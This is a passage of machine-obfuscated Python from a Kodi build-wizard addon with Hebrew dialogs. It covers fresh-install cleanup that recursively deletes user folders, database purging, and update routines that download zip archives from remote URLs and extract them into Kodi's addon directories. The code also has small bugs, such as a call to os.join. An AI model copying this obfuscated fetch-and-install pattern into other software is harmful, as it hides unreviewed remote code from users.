				elif OOOOOO000O0OOOOOO =='skin.Premium.mod.properties'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4680
				elif OOOOOO000O0OOOOOO =='favourites.xml'and O00OO0OOO00OO0OO0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4684
				elif OOOOOO000O0OOOOOO =='guisettings.xml'and O00OO0OOO00OO0OO0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4686
				elif OOOOOO000O0OOOOOO =='profiles.xml'and O00OO0OOO00OO0OO0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4687
				elif OOOOOO000O0OOOOOO =='advancedsettings.xml'and O00OO0OOO00OO0OO0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4688
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4689
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'program.apollo'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4690
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4691
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.elementum'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4694
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4695
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4696
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.quasar'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4698
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'program.apollo'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4699
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4700
				elif O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -2 ]=='userdata'and O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O00OO0OOO00OO0OO0 [O0OO000OO0O00OOOO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4701
				elif OOOOOO000O0OOOOOO in LOGFILES :wiz .log ("Keep Log File: %s"%OOOOOO000O0OOOOOO ,xbmc .LOGNOTICE )#line:4702
				elif OOOOOO000O0OOOOOO .endswith ('.db'):#line:4703
					try :#line:4704
						if OOOOOO000O0OOOOOO ==OO0O0O0O00OO00000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOOOO000O0OOOOOO ,KODIV ),xbmc .LOGNOTICE )#line:4705
						else :os .remove (os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ))#line:4706
					except Exception as OO00O0OOO0OOOOOOO :#line:4707
						if not OOOOOO000O0OOOOOO .startswith ('Textures13'):#line:4708
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4709
							wiz .log ("-> %s"%(str (OO00O0OOO0OOOOOOO )),xbmc .LOGNOTICE )#line:4710
							wiz .purgeDb (os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ))#line:4711
				else :#line:4712
					DP .update (int (wiz .percentage (O0000O00O00OO0O0O ,O0O000000OOOOOOO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO000O0OOOOOO ),'')#line:4713
					try :os .remove (os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ))#line:4714
					except Exception as OO00O0OOO0OOOOOOO :#line:4715
						wiz .log ("Error removing %s"%os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),xbmc .LOGNOTICE )#line:4716
						wiz .log ("-> / %s"%(str (OO00O0OOO0OOOOOOO )),xbmc .LOGNOTICE )#line:4717
			if DP .iscanceled ():#line:4718
				DP .close ()#line:4719
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4720
				return False #line:4721
		for OO0O00O0OOO0OO000 ,O00O00O0OOO00O00O ,OOO00O0O00O00O000 in os .walk (O00OO000000OO0O00 ,topdown =True ):#line:4722
			O00O00O0OOO00O00O [:]=[OO0OOOO00O00OO00O for OO0OOOO00O00OO00O in O00O00O0OOO00O00O if OO0OOOO00O00OO00O not in EXCLUDES ]#line:4723
			for OOOOOO000O0OOOOOO in O00O00O0OOO00O00O :#line:4724
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOOO000O0OOOOOO ),'')#line:4725
			  if OOOOOO000O0OOOOOO not in ["Database","userdata","temp","addons","addon_data"]:#line:4726
			   if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4727
			    if not (OOOOOO000O0OOOOOO =='skin.titan'and KEEPSKIN3 =='true'):#line:4729
			      if not (OOOOOO000O0OOOOOO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4730
			       if not (OOOOOO000O0OOOOOO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4731
			        if not (OOOOOO000O0OOOOOO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4732
			         if not (OOOOOO000O0OOOOOO =='program.apollo'and KEEPINFO =='true'):#line:4733
			          if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4734
			            if not (OOOOOO000O0OOOOOO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4736
			             if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4737
			              if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4738
			               if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4739
			                if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4740
			                 if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4741
			                  if not (OOOOOO000O0OOOOOO =='plugin.video.neptune'and KEEPINFO =='true'):#line:4742
			                   if not (OOOOOO000O0OOOOOO =='plugin.video.youtube'and KEEPINFO =='true'):#line:4743
			                    if not (OOOOOO000O0OOOOOO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4744
			                     if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4745
			                       if not (OOOOOO000O0OOOOOO =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4747
			                           if not (OOOOOO000O0OOOOOO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4751
			                            if not (OOOOOO000O0OOOOOO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4752
			                             if not (OOOOOO000O0OOOOOO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4753
			                              if not (OOOOOO000O0OOOOOO =='plugin.video.quasar'and KEEPINFO =='true'):#line:4754
			                               if not (OOOOOO000O0OOOOOO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4755
			                                  shutil .rmtree (os .path .join (OO0O00O0OOO0OO000 ,OOOOOO000O0OOOOOO ),ignore_errors =True ,onerror =None )#line:4757
			if DP .iscanceled ():#line:4758
				DP .close ()#line:4759
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4760
				return False #line:4761
		DP .close ()#line:4762
		wiz .clearS ('build')#line:4763
		if over ==True :#line:4764
			return True #line:4765
		elif install =='restore':#line:4766
			return True #line:4767
		elif install :#line:4768
			buildWizard (install ,'normal',over =True )#line:4769
		else :#line:4770
			if INSTALLMETHOD ==1 :OOO00O00O000000OO =1 #line:4771
			elif INSTALLMETHOD ==2 :OOO00O00O000000OO =0 #line:4772
			else :OOO00O00O000000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4773
			if OOO00O00O000000OO ==1 :wiz .reloadFix ('fresh')#line:4774
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4775
	else :#line:4776
		if not install =='restore':#line:4777
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4778
			wiz .refresh ()#line:4779
def clearCache ():#line:4784
		wiz .clearCache ()#line:4785
def fixwizard ():#line:4789
		wiz .fixwizard ()#line:4790
def totalClean ():#line:4792
		wiz .clearCache ()#line:4794
		wiz .clearPackages ('total')#line:4795
		clearThumb ('total')#line:4796
		cleanfornewbuild ()#line:4797
def cleanfornewbuild ():#line:4798
		try :#line:4799
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4800
		except :#line:4801
			pass #line:4802
		try :#line:4803
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4804
		except :#line:4805
			pass #line:4806
		try :#line:4807
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4808
		except :#line:4809
			pass #line:4810
def clearThumb (type =None ):#line:4811
	OOO0O0O0OOO00O0O0 =wiz .latestDB ('Textures')#line:4812
	if not type ==None :O000OO0000OOO0000 =1 #line:4813
	else :O000OO0000OOO0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOO0O0O0OOO00O0O0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4814
	if O000OO0000OOO0000 ==1 :#line:4815
		try :wiz .removeFile (os .join (DATABASE ,OOO0O0O0OOO00O0O0 ))#line:4816
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOO0O0O0OOO00O0O0 )#line:4817
		wiz .removeFolder (THUMBS )#line:4818
	else :wiz .log ('Clear thumbnames cancelled')#line:4820
	wiz .redoThumbs ()#line:4821
def purgeDb ():#line:4823
	OOO0O0OO0O000OO0O =[];O0OO0O000OO0000O0 =[]#line:4824
	for O00O000O00OO0000O ,O0OOOO0O00O0O0000 ,O0O00O0OO0O000O00 in os .walk (HOME ):#line:4825
		for OO0OOO0OO0OOO000O in fnmatch .filter (O0O00O0OO0O000O00 ,'*.db'):#line:4826
			if OO0OOO0OO0OOO000O !='Thumbs.db':#line:4827
				OO00OOO0OOOOOOO00 =os .path .join (O00O000O00OO0000O ,OO0OOO0OO0OOO000O )#line:4828
				OOO0O0OO0O000OO0O .append (OO00OOO0OOOOOOO00 )#line:4829
				OO0O00O0OOO0OO0OO =OO00OOO0OOOOOOO00 .replace ('\\','/').split ('/')#line:4830
				O0OO0O000OO0000O0 .append ('(%s) %s'%(OO0O00O0OOO0OO0OO [len (OO0O00O0OOO0OO0OO )-2 ],OO0O00O0OOO0OO0OO [len (OO0O00O0OOO0OO0OO )-1 ]))#line:4831
	if KODIV >=16 :#line:4832
		O0O0000O0000O000O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0O000OO0000O0 )#line:4833
		if O0O0000O0000O000O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4834
		elif len (O0O0000O0000O000O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4835
		else :#line:4836
			for OO000OOO000OO0O00 in O0O0000O0000O000O :wiz .purgeDb (OOO0O0OO0O000OO0O [OO000OOO000OO0O00 ])#line:4837
	else :#line:4838
		O0O0000O0000O000O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0O000OO0000O0 )#line:4839
		if O0O0000O0000O000O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4840
		else :wiz .purgeDb (OOO0O0OO0O000OO0O [OO000OOO000OO0O00 ])#line:4841
def fastupdatefirstbuild (O0O00O0OO00O0O0OO ):#line:4847
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4848
	if ENABLE =='Yes':#line:4849
		if not NOTIFY =='true':#line:4850
			O00OO00000000OO00 =wiz .workingURL (NOTIFICATION )#line:4851
			if O00OO00000000OO00 ==True :#line:4852
				O000O000O0OOOOO0O ,OO00OOO0OOOO00OOO =wiz .splitNotify (NOTIFICATION )#line:4853
				if not O000O000O0OOOOO0O ==False :#line:4855
					try :#line:4856
						O000O000O0OOOOO0O =int (O000O000O0OOOOO0O );O0O00O0OO00O0O0OO =int (O0O00O0OO00O0O0OO )#line:4857
						checkidupdate ()#line:4858
						wiz .setS ("notedismiss","true")#line:4859
						if O000O000O0OOOOO0O ==O0O00O0OO00O0O0OO :#line:4860
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O000O000O0OOOOO0O ),xbmc .LOGNOTICE )#line:4861
						elif O000O000O0OOOOO0O >O0O00O0OO00O0O0OO :#line:4863
							wiz .log ("[Notifications] id: %s"%str (O000O000O0OOOOO0O ),xbmc .LOGNOTICE )#line:4864
							wiz .setS ('noteid',str (O000O000O0OOOOO0O ))#line:4865
							wiz .setS ("notedismiss","true")#line:4866
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4869
					except Exception as O00OOO00000OOOOO0 :#line:4870
						wiz .log ("Error on Notifications Window: %s"%str (O00OOO00000OOOOO0 ),xbmc .LOGERROR )#line:4871
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4873
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00OO00000000OO00 ),xbmc .LOGNOTICE )#line:4874
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4875
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4876
def checkidupdate ():#line:4882
				wiz .setS ("notedismiss","true")#line:4884
				O0O0O00O00O00O00O =wiz .workingURL (NOTIFICATION )#line:4885
				OOOO000OOO00000OO =" Kodi Premium"#line:4887
				O0O0OOOOOOO0O0O00 =wiz .checkBuild (OOOO000OOO00000OO ,'gui')#line:4888
				O00O00O0OOO0OO000 =OOOO000OOO00000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4889
				if not wiz .workingURL (O0O0OOOOOOO0O0O00 )==True :return #line:4890
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4891
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOOO000OOO00000OO ),'','אנא המתן')#line:4892
				O0O00OOO0O000OOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O00O0OOO0OO000 )#line:4893
				try :os .remove (O0O00OOO0O000OOO0 )#line:4894
				except :pass #line:4895
				logging .warning (O0O0OOOOOOO0O0O00 )#line:4896
				if 'google'in O0O0OOOOOOO0O0O00 :#line:4897
				   OOO00000OOOO0OO0O =googledrive_download (O0O0OOOOOOO0O0O00 ,O0O00OOO0O000OOO0 ,DP ,wiz .checkBuild (OOOO000OOO00000OO ,'filesize'))#line:4898
				else :#line:4901
				  downloader .download (O0O0OOOOOOO0O0O00 ,O0O00OOO0O000OOO0 ,DP )#line:4902
				xbmc .sleep (100 )#line:4903
				O0OOO000OOO0OO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000OOO00000OO )#line:4904
				DP .update (0 ,O0OOO000OOO0OO0O0 ,'','אנא המתן')#line:4905
				extract .all (O0O00OOO0O000OOO0 ,HOME ,DP ,title =O0OOO000OOO0OO0O0 )#line:4906
				DP .close ()#line:4907
				wiz .defaultSkin ()#line:4908
				wiz .lookandFeelData ('save')#line:4909
				if KODIV >=18 :#line:4910
					skindialogsettind18 ()#line:4911
				if INSTALLMETHOD ==1 :OO00O00O0O0O00000 =1 #line:4914
				elif INSTALLMETHOD ==2 :OO00O00O0O0O00000 =0 #line:4915
				else :DP .close ()#line:4916
def gaiaserenaddon ():#line:4918
  O00OOOO0OOO000OO0 =(ADDON .getSetting ("gaiaseren"))#line:4919
  O0O00OO00OOOOOO0O =(ADDON .getSetting ("rdbuild"))#line:4920
  if O00OOOO0OOO000OO0 =='true'and O0O00OO00OOOOOO0O =='true':#line:4921
    OOOOOOOO00O000OOO =(NEWFASTUPDATE )#line:4922
    O0000OOOO00O00O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4923
    O0OO0O000O00OOOO0 =xbmcgui .DialogProgress ()#line:4924
    O0OO0O000O00OOOO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4925
    O0O00O0OOOO000000 =os .path .join (PACKAGES ,'isr.zip')#line:4926
    OOO00OOOOO0OO0000 =urllib2 .Request (OOOOOOOO00O000OOO )#line:4927
    OOOO000OO00OOO0OO =urllib2 .urlopen (OOO00OOOOO0OO0000 )#line:4928
    O0000OO0OOO0O0O0O =xbmcgui .DialogProgress ()#line:4930
    O0000OO0OOO0O0O0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4931
    O0000OO0OOO0O0O0O .update (0 )#line:4932
    O0O0OO0OOOO00O00O =open (O0O00O0OOOO000000 ,'wb')#line:4934
    try :#line:4936
      O000000O0OOOOO0OO =OOOO000OO00OOO0OO .info ().getheader ('Content-Length').strip ()#line:4937
      OOO0OOOO0OO00000O =True #line:4938
    except AttributeError :#line:4939
          OOO0OOOO0OO00000O =False #line:4940
    if OOO0OOOO0OO00000O :#line:4942
          O000000O0OOOOO0OO =int (O000000O0OOOOO0OO )#line:4943
    O000O00OOOO0OOOOO =0 #line:4945
    O000O00OO0OOO00OO =time .time ()#line:4946
    while True :#line:4947
          O0OO00OOO0000O0OO =OOOO000OO00OOO0OO .read (8192 )#line:4948
          if not O0OO00OOO0000O0OO :#line:4949
              sys .stdout .write ('\n')#line:4950
              break #line:4951
          O000O00OOOO0OOOOO +=len (O0OO00OOO0000O0OO )#line:4953
          O0O0OO0OOOO00O00O .write (O0OO00OOO0000O0OO )#line:4954
          if not OOO0OOOO0OO00000O :#line:4956
              O000000O0OOOOO0OO =O000O00OOOO0OOOOO #line:4957
          if O0000OO0OOO0O0O0O .iscanceled ():#line:4958
             O0000OO0OOO0O0O0O .close ()#line:4959
             try :#line:4960
              os .remove (O0O00O0OOOO000000 )#line:4961
             except :#line:4962
              pass #line:4963
             break #line:4964
          OOO00O0OOOO0OO0O0 =float (O000O00OOOO0OOOOO )/O000000O0OOOOO0OO #line:4965
          OOO00O0OOOO0OO0O0 =round (OOO00O0OOOO0OO0O0 *100 ,2 )#line:4966
          OO0O0OOOOOO0O0O00 =O000O00OOOO0OOOOO /(1024 *1024 )#line:4967
          OOO00O0O0O000OO00 =O000000O0OOOOO0OO /(1024 *1024 )#line:4968
          O0000OO000O000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O0OOOOOO0O0O00 ,'teal',OOO00O0O0O000OO00 )#line:4969
          if (time .time ()-O000O00OO0OOO00OO )>0 :#line:4970
            OO00O0O00OO00OOO0 =O000O00OOOO0OOOOO /(time .time ()-O000O00OO0OOO00OO )#line:4971
            OO00O0O00OO00OOO0 =OO00O0O00OO00OOO0 /1024 #line:4972
          else :#line:4973
           OO00O0O00OO00OOO0 =0 #line:4974
          OO00OO0O00000O0OO ='KB'#line:4975
          if OO00O0O00OO00OOO0 >=1024 :#line:4976
             OO00O0O00OO00OOO0 =OO00O0O00OO00OOO0 /1024 #line:4977
             OO00OO0O00000O0OO ='MB'#line:4978
          if OO00O0O00OO00OOO0 >0 and not OOO00O0OOOO0OO0O0 ==100 :#line:4979
              OOOO0O0OOO0O00OO0 =(O000000O0OOOOO0OO -O000O00OOOO0OOOOO )/OO00O0O00OO00OOO0 #line:4980
          else :#line:4981
              OOOO0O0OOO0O00OO0 =0 #line:4982
          OOO0O0OO0O000OO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O0O00OO00OOO0 ,OO00OO0O00000O0OO )#line:4983
          O0000OO0OOO0O0O0O .update (int (OOO00O0OOOO0OO0O0 ),O0000OO000O000OOO ,OOO0O0OO0O000OO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4985
    O0O0OOOOOOOOOO0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4988
    O0O0OO0OOOO00O00O .close ()#line:4991
    extract .all (O0O00O0OOOO000000 ,O0O0OOOOOOOOOO0OO ,O0000OO0OOO0O0O0O )#line:4992
    try :#line:4996
      os .remove (O0O00O0OOOO000000 )#line:4997
    except :#line:4998
      pass #line:4999
def testnotify ():#line:5001
	OOOO0O0OOO000000O =wiz .workingURL (NOTIFICATION )#line:5002
	if OOOO0O0OOO000000O ==True :#line:5003
		try :#line:5004
			O00O00OO00OO00OOO ,O00OO0OOO0OOOO0OO =wiz .splitNotify (NOTIFICATION )#line:5005
			if O00O00OO00OO00OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5006
			if STARTP2 ()=='ok':#line:5007
				notify .notification (O00OO0OOO0OOOO0OO ,True )#line:5008
		except Exception as O00OOOO0O0O0OO0OO :#line:5009
			wiz .log ("Error on Notifications Window: %s"%str (O00OOOO0O0O0OO0OO ),xbmc .LOGERROR )#line:5010
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5011
def testnotify2 ():#line:5012
	OO000000O0O000O00 =wiz .workingURL (NOTIFICATION2 )#line:5013
	if OO000000O0O000O00 ==True :#line:5014
		try :#line:5015
			OO0OO0000OO000OO0 ,O0000O00OO000O0OO =wiz .splitNotify (NOTIFICATION2 )#line:5016
			if OO0OO0000OO000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5017
			if STARTP2 ()=='ok':#line:5018
				notify .notification2 (O0000O00OO000O0OO ,True )#line:5019
		except Exception as OO0OO0OOOO000OOO0 :#line:5020
			wiz .log ("Error on Notifications Window: %s"%str (OO0OO0OOOO000OOO0 ),xbmc .LOGERROR )#line:5021
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5022
def testnotify3 ():#line:5023
	OOO0O0OOO0OO000OO =wiz .workingURL (NOTIFICATION3 )#line:5024
	if OOO0O0OOO0OO000OO ==True :#line:5025
		try :#line:5026
			OO0O0000O0OO000O0 ,O0OOOOOOO000OO0OO =wiz .splitNotify (NOTIFICATION3 )#line:5027
			if OO0O0000O0OO000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5028
			if STARTP2 ()=='ok':#line:5029
				notify .notification3 (O0OOOOOOO000OO0OO ,True )#line:5030
		except Exception as O0O00O0OOOO00OO0O :#line:5031
			wiz .log ("Error on Notifications Window: %s"%str (O0O00O0OOOO00OO0O ),xbmc .LOGERROR )#line:5032
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5033
def servicemanual ():#line:5034
	O0OOO00O00O0O00OO =wiz .workingURL (HELPINFO )#line:5035
	if O0OOO00O00O0O00OO ==True :#line:5036
		try :#line:5037
			O0O0OOOOO000OOO00 ,OOOO0OO000O0O0O0O =wiz .splitNotify (HELPINFO )#line:5038
			if O0O0OOOOO000OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5039
			notify .helpinfo (OOOO0OO000O0O0O0O ,True )#line:5040
		except Exception as O000OOOOOO0000OOO :#line:5041
			wiz .log ("Error on Notifications Window: %s"%str (O000OOOOOO0000OOO ),xbmc .LOGERROR )#line:5042
